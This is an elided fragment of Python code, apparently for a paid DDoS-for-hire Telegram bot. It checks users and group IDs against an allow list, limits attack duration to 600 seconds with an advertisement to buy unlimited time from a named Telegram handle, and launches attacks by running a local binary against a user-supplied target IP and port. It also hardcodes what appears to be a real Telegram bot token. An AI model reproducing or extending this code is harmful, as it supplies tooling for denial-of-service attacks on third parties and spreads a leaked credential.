...
bot = telebot.TeleBot('7474892140:AAF8JSonYx4IMGYkStwzMBjTQzN4OdRpaeY')
...
allowed_groups = ['-1002246957527']  # Add allowed group IDs as strings
    ...
    if user_id in allowed_users or chat_id in allowed_groups:
        ...
        if len(command) == 4:
            ...
            if time_in_seconds > 600:
                response = "Error: Time Limit 600 Sec, Buy From @PsychoVillain19 For More Unlimited Time-"
                bot.reply_to(message, response)
            else:
                attack_running = True
                ...
                try:
                    ...
                    # Start the attack
                    full_command = f"./mrin {target} {port} {time_in_seconds} 900"
